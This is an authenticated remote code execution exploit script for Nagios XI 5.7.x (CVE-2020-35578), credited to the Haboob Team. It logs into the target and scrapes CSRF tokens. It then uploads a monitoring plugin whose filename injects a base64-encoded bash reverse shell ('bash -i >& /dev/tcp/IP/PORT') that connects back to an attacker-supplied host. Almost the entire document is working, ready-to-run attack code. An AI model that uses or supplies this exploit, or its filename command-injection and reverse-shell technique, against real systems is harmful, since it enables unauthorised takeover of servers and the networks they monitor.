# Exploit Title: Nagios XI 5.7.X - Remote Code Execution RCE (Authenticated)
# Date: 19/12/2020
# Exploit Author: Haboob Team (https://haboob.sa)
# Vendor Homepage: https://www.nagios.com/products/nagios-xi/
# Version: Nagios XI 5.7.x
# Tested on: (Ubuntu 18.04 / PHP 7.2.24) & Vendor's custom VM
# CVE: CVE-2020-35578

#!/usr/bin/python3

# pip3 install bs4 lxml
import requests
import sys
import warnings
from bs4 import BeautifulSoup
import base64
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

if len(sys.argv) != 6:
    print("[~] Usage : python3 nagiosxi-rce.py http(s)://url username password reverse_ip reverse_port")
    print("[~] Example : python3 nagiosxi-rce.py https://192.168.224.139 nagiosadmin P@ssw0rd 192.168.224.138 443")
    exit()

url = sys.argv[1]
username = sys.argv[2]
password = sys.argv[3]
ip = sys.argv[4]
port = sys.argv[5]

request = requests.session()


def login():
    # Request nsp value (Nagios Session Protection, used to prevent CSRF attacks)
    nsp_str_req = request.get(url+"/nagiosxi/login.php", verify=False)
    content = nsp_str_req.text
    soup = BeautifulSoup(content, "lxml")
    nsp_str = soup.find_all('input')[0].get('value')
    print("[+] Extract login nsp token : %s" % nsp_str)

    # Login
    login_info = {
    "nsp": nsp_str,
    "pageopt": "login",
    "username": username,
    "password": password
    }
    login_request = request.post(url + "/nagiosxi/login.php", login_info, verify=False)
    login_text = login_request.text

    # Check Login Status
    if "Core Config Manager" in login_text:
        return True
    else:
        print("[-] Login ... Failed!")
        return False



def execute_payload():
    # Request nsp value (Nagios Session Protection, used to prevent CSRF attacks)
    print("[+] Request upload form ...")
    nsp_str_req = request.get(url+"/nagiosxi/admin/monitoringplugins.php", verify=False)
    content = nsp_str_req.text
    soup = BeautifulSoup(content, "lxml")
    nsp_str = soup.find_all('input')[1].get('value')
    print("[+] Extract upload nsp token : %s" % nsp_str)

    # Payload Base64 Encoding
    payload_decoded = "bash -i >& /dev/tcp/%s/%s 0>&1" % (ip, port)
    payload_bytes = payload_decoded.encode('ascii')
    base64_bytes = base64.b64encode(payload_bytes)
    payload_encoded = base64_bytes.decode('ascii')
    payload = ";echo " + payload_encoded + " | base64 -d | bash;#"
    print("[+] Base64 encoded payload : %s" % payload)

    # Payload Execution
    multipart_form_data = {
    'upload': (None, '', None),
    'nsp': (None, nsp_str, None),
    'uploadedfile': (payload, 'whatever', 'text/plain'),
    'convert_to_unix': (None, '1', None),
    }
    print("[+] Sending payload ...")
    print("[+] Check your nc ...")
    rce = request.post(url +"/nagiosxi/admin/monitoringplugins.php", files=multipart_form_data, verify=False)



if login():
    print("[+] Login ... Success!")
    execute_payload()